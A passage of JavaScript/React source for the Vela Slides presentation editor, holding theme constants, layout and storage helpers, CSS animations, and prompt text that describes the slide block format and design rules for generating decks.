  const body = ((slide && slide.blocks) || []).filter((b) => b.type !== "image" && b.type !== "spacer" && b.type !== "divider");
  const mostlyTitle = body.length <= 2 && body.every((b) => PASTE_TITLE_BLOCKS.has(b.type));
  const wide = aspect >= 1.6;
  return (!mostlyTitle && !wide) ? "image-right" : "stack";
}

// ━━━ Status & Importance Meta ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const STATUSES = ["todo", "done", "signed-off"];
const STATUS_META = {
  todo: { label: "To Do", icon: "○", next: "done" },
  done: { label: "Done", icon: "●", next: "signed-off" },
  "signed-off": { label: "Signed Off", icon: "✦", next: "todo" },
};
const IMP = {
  must: { label: "Must", dot: "#ef4444" },
  should: { label: "Should", dot: "#f59e0b" },
  nice: { label: "Nice", dot: "#64748b" },
};

// ━━━ Themes ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const themes = {
  dark: {
    bg: "#060a14", bgPanel: "#0c1221", bgCard: "#111827", bgInput: "#0a0f1c",
    border: "#1a2540", borderLight: "#243050", accent: "#3B82F6", accentGlow: "rgba(59,130,246,0.12)",
    text: "#e2e8f0", textMuted: "#7a8ba4", textDim: "#4a5a72",
    green: "#10b981", purple: "#a78bfa", red: "#ef4444", amber: "#f59e0b",
    slideBg: "#0a0f1c", codeBg: "#0d1117", isDark: true,
  },
  light: {
    bg: "#f8fafc", bgPanel: "#ffffff", bgCard: "#ffffff", bgInput: "#f1f5f9",
    border: "#e2e8f0", borderLight: "#cbd5e1", accent: "#2563EB", accentGlow: "rgba(37,99,235,0.08)",
    text: "#0f172a", textMuted: "#64748b", textDim: "#94a3b8",
    green: "#059669", purple: "#7c3aed", red: "#ef4444", amber: "#d97706",
    slideBg: "#f1f5f9", codeBg: "#f1f5f9", isDark: false,
  },
};
let T = themes.dark;
const statusColor = (s) => ({ todo: T.textDim, done: T.green, "signed-off": T.purple }[s]);
const FONT = { display: "'Sora', sans-serif", body: "'DM Sans', sans-serif", mono: "'Space Mono', monospace" };

// Auto-generated module title card ("present card"). Shown as a virtual slide in
// presentation mode and exported to PDF so the deck exports exactly as presented.
function buildTitleCardSlide(item, lane, branding) {
  const accent = branding?.accentColor || T.accent;
  const slideCount = (item.slides || []).length;
  const totalTime = (item.slides || []).reduce((a, s) => a + (s.duration || 0), 0);
  const timeStr = totalTime > 0 ? `${Math.floor(totalTime / 60)}m ${totalTime % 60}s` : "";
  return {
    _virtual: true,
    bg: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
    color: "#0f172a", accent,
    align: "center", verticalAlign: "center", padding: "60px 80px", gap: 20,
    blocks: [
      ...(lane ? [{ type: "badge", text: (lane.title || "").toUpperCase(), bg: accent + "18", color: accent, icon: "Layers" }] : []),
      { type: "heading", text: item.title, size: "4xl", color: "#0f172a" },
      ...(timeStr ? [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""} · ${timeStr}`, size: "lg", color: "#64748b" }] : [{ type: "text", text: `${slideCount} slide${slideCount !== 1 ? "s" : ""}`, size: "lg", color: "#64748b" }]),
      { type: "spacer", h: 8 },
    ],
    duration: 3,
  };
}

// ━━━ Vela Logo Icon ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function VelaIcon({ size = 18, color }) {
  const c = color || T.accent;
  return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
    <path d="M12 2 L12 22" stroke={c} strokeWidth="1.5" strokeLinecap="round" />
    <path d="M12 3 Q20 8 14 18 L12 18 Z" fill={c} opacity="0.85" />
    <path d="M12 6 Q6 10 10 18 L12 18 Z" fill={c} opacity="0.4" />
    <path d="M8 22 L16 22" stroke={c} strokeWidth="1.5" strokeLinecap="round" />
  </svg>;
}
const BASE_SIZES = { xs: "0.85rem", sm: "0.95rem", md: "1.05rem", lg: "1.2rem", xl: "1.5rem", "2xl": "2rem", "3xl": "2.6rem", "4xl": "3.2rem" };

// ━━━ Style Factories & Helpers ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const saveKV = (k, v) => window.storage.set(k, JSON.stringify(v)).catch((e) => { dbg("Storage error:", e); });
const delKV = (k) => window.storage.delete(k).catch((e) => { dbg("Storage delete error:", e); });
const extractSave = (s) => { const { chatLoading, fullscreen, lastDebug, _bootstrap, veraMode, teacherHistory, teacherLoading, reviewMode, commentsPanelOpen, ...rest } = s; if (rest.chatMessages) rest.chatMessages = rest.chatMessages.filter((m) => !m._system); return rest; };

// Distributed storage: master has items with metadata only (no slides)
const extractMaster = (s) => {
  const { chatLoading, fullscreen, lastDebug, ...rest } = s;
  return {
    ...rest,
    _version: 2,
    lanes: rest.lanes.map((l) => ({
      ...l,
      items: l.items.map(({ slides, ...meta }) => meta),
    })),
  };
};
// Collect all comments across items and slides, enriched with context
function collectComments(lanes, filter) {
  const results = [];
  for (const lane of lanes) {
    for (const item of lane.items) {
      for (const c of (item.comments || [])) {
        if (!filter || filter(c)) results.push({ ...c, itemId: item.id, itemTitle: item.title, laneTitle: lane.title, slideIndex: null });
      }
      for (let si = 0; si < (item.slides || []).length; si++) {
        for (const c of (item.slides[si].comments || [])) {
          if (!filter || filter(c)) results.push({ ...c, itemId: item.id, itemTitle: item.title, laneTitle: lane.title, slideIndex: si });
        }
      }
    }
  }
  return results;
}

// Format comments as structured markdown for agent consumption
function formatCommentsForAgent(lanes) {
  const open = collectComments(lanes, (c) => c.status === "open");
  if (open.length === 0) return "No open comments.";
  const grouped = {};
  for (const c of open) {
    const key = c.itemTitle;
    if (!grouped[key]) grouped[key] = [];
    grouped[key].push(c);
  }
  let md = `## Comments (${open.length} open)\n`;
  for (const [mod, comments] of Object.entries(grouped)) {
    md += `\n### Module: "${mod}"\n`;
    for (const c of comments) {
      const loc = c.slideIndex != null ? `Slide ${c.slideIndex + 1}` : "(module)";
      const anchor = c.anchor ? ` ["${c.anchor}"]` : "";
      md += `- ${loc}${anchor}: ${c.text}\n`;
    }
  }
  return md;
}

// All item IDs across all lanes
const allItemIds = (lanes) => { const ids = []; for (const l of lanes) for (const i of l.items) ids.push(i.id); return ids; };
// Find an item by id across lanes
const findItem = (lanes, id) => { for (const l of lanes) { const it = l.items.find((i) => i.id === id); if (it) return it; } return null; };
const fmtSize = (b) => b < 1024 ? `${b}B` : b < 1048576 ? `${(b / 1024).toFixed(1)}KB` : `${(b / 1048576).toFixed(2)}MB`;
const fmtTime = (s) => { if (!s || s <= 0) return ""; const h = Math.floor(s / 3600); const m = Math.floor((s % 3600) / 60); const sec = s % 60; if (h > 0) return m > 0 ? `${h}h ${m}m` : `${h}h`; if (m > 0) return sec > 0 ? `${m}m ${sec}s` : `${m}m`; return `${sec}s`; };
// Compact, minutes-only duration for the top header (leaves room for the slide
// count). Rounds to the nearest minute; anything >0 but under a minute shows "<1m".
const fmtTimeMin = (s) => { if (!s || s <= 0) return ""; const totalMin = Math.round(s / 60); if (totalMin <= 0) return "<1m"; const h = Math.floor(totalMin / 60); const m = totalMin % 60; if (h > 0) return m > 0 ? `${h}h ${m}m` : `${h}h`; return `${m}m`; };
// Slide visibility helpers (CR: hide/unhide slides). Hidden slides are excluded
// from presentation counts, totals, and presenter navigation, but remain in the
// editor list so they can be unhidden.
const visibleSlides = (slides) => (slides || []).filter((s) => !(s && s.hidden));
const sumDurations = (slides) => (slides || []).reduce((s, sl) => s + (sl.duration || 0), 0);
const sumVisibleDurations = (slides) => visibleSlides(slides).reduce((s, sl) => s + (sl.duration || 0), 0);
const S = {
  btn: (o = {}) => ({ padding: "3px 8px", fontSize: 10, fontFamily: FONT.mono, fontWeight: 700, background: "transparent", border: `1px solid ${T.border}`, borderRadius: 3, color: T.textDim, cursor: "pointer", ...o }),
  primaryBtn: (o = {}) => ({ padding: "4px 10px", fontSize: 10, fontFamily: FONT.mono, fontWeight: 700, background: T.accent, color: "#fff", border: "none", borderRadius: 3, cursor: "pointer", ...o }),
  cancelBtn: (o = {}) => ({ padding: "4px 8px", fontSize: 10, background: "transparent", color: T.textDim, border: `1px solid ${T.border}`, borderRadius: 3, cursor: "pointer", ...o }),
  input: (o = {}) => ({ flex: 1, padding: "4px 8px", fontSize: 12, fontFamily: FONT.body, background: T.bgInput, border: `1px solid ${T.border}`, borderRadius: 3, color: T.text, outline: "none", ...o }),
  panel: (o = {}) => ({ borderBottom: `1px solid ${T.border}`, background: T.bgPanel, ...o }),
};

// ━━━ CSS Generator ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const getCss = () => `
@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=DM+Sans:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{opacity:0.4;transform:scale(1)}50%{opacity:1;transform:scale(1.15)}}
@keyframes loading-bar{0%{transform:translateX(-100%)}50%{transform:translateX(60%)}100%{transform:translateX(-100%)}}
::-webkit-scrollbar{width:5px} ::-webkit-scrollbar-track{background:transparent} ::-webkit-scrollbar-thumb{background:${T.border};border-radius:3px}
.concept-row{transition:all .15s;cursor:pointer} .concept-row:hover{background:${T.accentGlow}!important} .concept-row.selected{background:${T.accent}18!important;border-left-color:${T.accent}!important}
.status-btn{cursor:pointer;transition:transform .15s} .status-btn:hover{transform:scale(1.3)}
.slide-nav-btn{opacity:.4;transition:opacity .2s;cursor:pointer} .slide-nav-btn:hover{opacity:1}
.imp-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.add-btn{transition:all .15s} .add-btn:hover{background:${T.accent}!important;color:#fff!important}
.lane-header{transition:background .15s} .lane-header:hover{background:${T.bgCard}!important}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}} .fade-in{animation:fadeIn .3s ease-out}
@keyframes slideTransitionFade{from{opacity:0;transform:scale(0.985)}to{opacity:1;transform:scale(1)}} .slide-transition-fade{animation:slideTransitionFade .25s ease-out both}
@keyframes navToastIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
@keyframes navToastOut{from{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(-6px)}}
.nav-toast-in{animation:navToastIn .25s ease-out forwards}
.nav-toast-out{animation:navToastOut .3s ease-in forwards}
@keyframes magicReveal{
  0%{opacity:0;transform:scale(0.96);filter:blur(6px) brightness(1.3)}
  40%{opacity:1;transform:scale(1.01);filter:blur(0px) brightness(1.15)}
  70%{transform:scale(1.0);filter:blur(0px) brightness(1.05)}
  100%{transform:scale(1);filter:blur(0px) brightness(1)}
}
@keyframes shimmerSweep{
  0%{left:-100%}
  60%{left:100%}
  100%{left:100%}
}
@keyframes glowPulse{
  0%{box-shadow:0 0 0px rgba(59,130,246,0),0 0 0px rgba(167,139,250,0)}
  30%{box-shadow:0 0 24px rgba(59,130,246,0.4),0 0 48px rgba(167,139,250,0.2)}
  100%{box-shadow:0 0 0px rgba(59,130,246,0),0 0 0px rgba(167,139,250,0)}
}
.magic-reveal{animation:magicReveal .6s cubic-bezier(0.16,1,0.3,1) forwards, glowPulse 1.2s ease-out forwards;position:relative;overflow:hidden}
.magic-reveal::after{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.12),rgba(167,139,250,0.08),transparent);animation:shimmerSweep 1s ease-out .15s forwards;z-index:15;pointer-events:none}
@keyframes stg{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
@keyframes veraScan{0%{left:-60%}100%{left:160%}}
@keyframes veraPulse{0%,100%{filter:brightness(1) saturate(1)}50%{filter:brightness(1.08) saturate(1.2)}}
.vera-thinking{position:relative;overflow:hidden;animation:veraPulse 2s ease-in-out infinite}
.vera-thinking::before{content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,0.06),rgba(167,139,250,0.12),rgba(59,130,246,0.06),transparent);animation:veraScan 2s ease-in-out infinite;z-index:15;pointer-events:none}
.vera-thinking::after{content:'';position:absolute;top:0;left:-60%;width:30%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);animation:veraScan 2s ease-in-out .6s infinite;z-index:15;pointer-events:none}
[class^="stg-"]{max-width:100%;box-sizing:border-box}
.stg-1{animation:stg .4s ease-out .05s both}.stg-2{animation:stg .4s ease-out .12s both}.stg-3{animation:stg .4s ease-out .19s both}
.stg-4{animation:stg .4s ease-out .26s both}.stg-5{animation:stg .4s ease-out .33s both}.stg-6{animation:stg .4s ease-out .4s both}.stg-7{animation:stg .4s ease-out .47s both}
.mob-tab{display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px 0;flex:1;cursor:pointer;border:none;background:transparent;font-family:${FONT.mono};font-size:8px;font-weight:600;letter-spacing:0.03em;transition:color .15s}
.mob-tab-active{color:${T.accent}!important}
.vela-pdf-capture [data-zoom-badge]{display:none!important}
`;

// ━━━ Mobile Detection ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const MOBILE_BP = 500;
function useIsMobile() {
  const [m, setM] = useState(() => {
    if (typeof window === "undefined") return false;
    const isTouch = window.matchMedia?.("(pointer: coarse)")?.matches;
    const isNarrow = window.innerWidth < MOBILE_BP;
    return isNarrow || (isTouch && window.innerWidth < 600);
  });
  useEffect(() => {
    const check = () => {
      const isTouch = window.matchMedia?.("(pointer: coarse)")?.matches;
      const isNarrow = window.innerWidth < MOBILE_BP;
      setM(isNarrow || (isTouch && window.innerWidth < 600));
    };
    window.addEventListener("resize", check);
    // Also re-check on orientation change (mobile rotation)
    window.addEventListener("orientationchange", () => setTimeout(check, 150));
    return () => { window.removeEventListener("resize", check); };
  }, []);
  return m;
}

function useSwipe(ref, { onLeft, onRight, threshold = 50 } = {}) {
  useEffect(() => {
    const el = ref.current; if (!el) return;
    let startX = 0, startY = 0;
    const onStart = (e) => { const t = e.touches[0]; startX = t.clientX; startY = t.clientY; };
    const onEnd = (e) => {
      const t = e.changedTouches[0]; const dx = t.clientX - startX; const dy = t.clientY - startY;
      if (Math.abs(dx) > Math.abs(dy) && Math.abs(dx) > threshold) {
        if (dx < 0 && onLeft) onLeft();
        if (dx > 0 && onRight) onRight();
      }
    };
    el.addEventListener("touchstart", onStart, { passive: true });
    el.addEventListener("touchend", onEnd, { passive: true });
    return () => { el.removeEventListener("touchstart", onStart); el.removeEventListener("touchend", onEnd); };
  }, [ref, onLeft, onRight, threshold]);
}

// ━━━ Shared Prompt Constants (deduped from 3 system prompts) ━━━━━━━
const BLOCK_REFERENCE = `Slide: { blocks: [...], bg?, bgGradient?: "linear-gradient(...)", color?, accent?, align?, verticalAlign?, padding?, gap?, duration?: seconds_integer, layout?: "stack"|"image-right"|"image-left"|"cols", contentFlex?, imageFlex?, splitGap?, L?: [...], R?: [...] }
Layout: "stack" (default) = vertical column. "image-right"/"image-left" = splits content blocks and image blocks side-by-side. "cols" = explicit two-column layout using L (left blocks) and R (right blocks) arrays. blocks renders full-width above columns (optional header). contentFlex/imageFlex control column ratio (default 1:1). splitGap controls gap between columns (default 32).
Inline formatting: All text supports **bold**, *italic*, ***bold+italic*** using markdown syntax (also __bold__ and _italic_). Use in headings, text, bullets, callouts, etc.
Links: ANY block can have an optional "link" property: {type:"text", text:"Read the paper", link:"https://..."} — renders clickable. For sources/citations, ALWAYS use a descriptive text block or badge with link property instead of putting raw URLs in text. E.g. {type:"badge", text:"📎 Yao et al., ReAct (2022)", icon:"ExternalLink", link:"https://arxiv.org/abs/2210.03629"} or {type:"text", text:"Source: Snorkel AI Blog", size:"sm", link:"https://snorkel.ai/blog/..."}
Block types:
- heading: {type:"heading", text, size:"xs|sm|md|lg|xl|2xl|3xl|4xl", color?, weight?, align?, icon?:"Zap", iconColor?}
- text: {type:"text", text, size?, color?, bold?, italic?, align?, maxWidth?}
- bullets: {type:"bullets", items:["string" or {text, icon?:"CheckCircle", link?:"https://..."},...], size?, dotColor?, gap?, color?}
- image: {type:"image", src, caption?, maxWidth?, shadow?, rounded?}
- code: {type:"code", text:"code here", label?"JAVASCRIPT", size?, bg?, color?}
- grid: {type:"grid", cols:1|2|3, gap?, items:[{blocks:[...], bg?, padding?, borderRadius?, border?, style?, align?, direction?:"row"|"column"}]}
- callout: {type:"callout", text, title?, bg?, border?, color?, icon?:"AlertTriangle"}
- metric: {type:"metric", value:"42", label?"METRIC NAME", size?"3xl", color?, labelColor?, icon?:"TrendingUp", iconColor?}
- quote: {type:"quote", text, author?, size?, color?}
- badge: {type:"badge", text:"LABEL", color?, bg?, icon?:"Star"}
- icon: {type:"icon", name:"Zap", size?"sm|md|lg|xl", color?, bg?, circle?:true, label?, border?}
- icon-row: {type:"icon-row", items:[{icon:"Zap", title:"Title", text?"Description", link?:"https://...", iconColor?, iconBg?}], cols?:1|2|3, iconBg?, iconColor?, iconShape?"circle|square", gap?, titleSize?, textSize?}  — USE cols:2 for 4+ items with short text to fill horizontal space
- flow: {type:"flow", items:[{icon?:"FileText", label:"Step Name", sublabel?:"optional detail"},...], arrowColor?, direction?"horizontal|vertical", connectorStyle?"arrow|dashed|line", iconBg?, labelColor?, sublabelColor?, loop?:true, loopLabel?:"repeat until done", loopColor?, loopStyle?:"dashed|dotted|solid"}
- svg: {type:"svg", markup:"<svg viewBox='0 0 400 160' xmlns='http://www.w3.org/2000/svg'>...</svg>", maxWidth?:"80%", align?:"center", caption?, captionColor?, captionSize?:"sm", bg?, padding?, rounded?:true} — Use {{color}}, {{accent}}, {{bg}}, {{muted}} tokens for theme colors. For diagrams that structured blocks can't express (loops, fan-outs, meshes, variable-width layers).
- table: {type:"table", headers:["Col1","Col2",...], rows:[["cell","cell",...]], striped?:true, headerBg?, headerColor?, cellColor?, borderColor?, size?}
- progress: {type:"progress", items:[{label:"Python", value:90, color?"#3b82f6"},...], showValue?:true, trackColor?, height?, labelColor?, size?}
- steps: {type:"steps", items:[{title:"Step 1", text?"Description"},...], lineColor?, activeStep?:2, numberColor?, titleColor?, textColor?}
- tag-group: {type:"tag-group", items:[{text:"React", color?"#61dafb", icon?:"Code"},...], variant?"filled|outline|subtle", gap?, size?}
- timeline: {type:"timeline", items:[{date:"Q1 2025", title:"Alpha", text?"Internal testing"},...], lineColor?, dotColor?, dateColor?, titleColor?, textColor?, direction?"horizontal|vertical"}
- spacer: {type:"spacer", h:16}
- divider: {type:"divider", color?, spacing?}`;

const ICON_LIST = `Icons: any PascalCase Lucide name (1000+ available). Common: Zap, Star, CheckCircle, ArrowRight, Brain, Rocket, Shield, Target, Clock, Users, Heart, Globe, Code, Database, Settings, Lightbulb, AlertTriangle, TrendingUp, BarChart, Lock, Eye, Cpu, Layers, GitBranch, Terminal, Puzzle, Sparkles, Award, Book, MessageSquare, Send, Play, Pause, RefreshCw, Search, Filter, Download, Upload, Share2, Link, Bookmark, Flag, Bell, Calendar, Map, Compass, Coffee, Pen, Palette, Camera, Mic, Music, Film, Monitor, Smartphone, Tablet, Wifi, Cloud, Server, HardDrive, Box, Package, Truck, ShoppingCart, DollarSign, CreditCard, PieChart, Activity, Thermometer, Umbrella, Sun, Moon, Droplets, Wind, Flame, Leaf, TreePine, Mountain, Waves, Check, XCircle, Info, HelpCircle, ExternalLink, Copy, Trash2, Edit, Save, Home, Briefcase, GraduationCap, Trophy, MapPin, Phone, Mail, Tag, File, Clipboard, LineChart, TrendingDown, Anchor, Scissors, Image, ArrowUp, ArrowDown, ArrowLeft, ChevronUp, ChevronDown`;

const DESIGN_RULES = `### DESIGN RULES — follow these for every slide (user instructions override these if conflicting)
- Every slide MUST have a bg or bgGradient. Choose colors that match the overall theme (dark or light as instructed).
- Set color (text) and accent per-slide to ensure good contrast against the bg.
- USE THE FULL CANVAS WIDTH. Content should span at least 80% of the 960px width. Avoid narrow left-hugging layouts.
  - For 4+ icon-row items with short text: set cols:2 on the icon-row block to spread across the slide
  - For short text items: prefer grid (2-3 cols) with icon blocks, or icon-row with cols:2
  - Set padding to "36px 48px" or wider — never let content cluster in one corner
  - Headings and text blocks: use align:"left" with full width, not constrained maxWidth
- Use badge blocks for section labels/tags above headings — add icon prop for polish
- Use spacer blocks (h: 8-24) between sections for breathing room
- Size hierarchy: 3xl-4xl for title slides, 2xl for section headings, lg-md for body, sm-xs for labels
- Use callout blocks with custom bg/border colors and icons for key insights
- Use metric blocks for stats/numbers with large size, accent color, and icon
- Use grid blocks (cols: 2 or 3) for side-by-side comparisons with icon blocks inside
- Use icon-row blocks instead of bullets for feature lists — much more visual
- When icon-row has 4+ items with short text, PREFER grid with 2 cols of icon-row or icon blocks to fill horizontal space
- Use flow blocks for pipelines, architectures, processes, funnels — shows relationships with arrows
- Use flow with loop:true for iterative processes, agent loops, feedback cycles, ReAct patterns, OODA loops
- Use svg blocks for diagrams that no structured block can express — fan-outs, mesh connectors, probability distributions, variable-width layer stacks. Always use {{accent}}, {{color}}, {{muted}}, {{bg}} theme tokens in SVG markup. Keep viewBox height ≤200px. Use stroke-based outlines over filled shapes.
- Use table blocks for comparisons, pricing, feature matrices, schedules — avoid grid hacks for tabular data
- Use progress blocks for skills, benchmarks, completion bars, poll results — anything quantitative
- Use steps blocks for sequential processes, onboarding, methodology — implies numbered order with connecting line
- Use tag-group blocks for tech stacks, categories, labels — wrapping inline chips
- Use timeline blocks for roadmaps, milestones, company history — temporal progression
- Use icons in headings for visual anchors. Vary layouts: don't repeat heading+bullets.
- EVERY content slide should have at least one icon somewhere
- First slide = title slide: centered, gradient bg, large heading (3xl+), subtitle, badge with icon
- Last slide = summary/takeaway: gradient bg, quote or key bullets with icons, strong close
- ALWAYS set duration (integer seconds) estimating speaking time: title slides 15-30s, simple content 60-90s, dense/code 90-180s, metrics 20-40s, quotes 15-30s`;// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
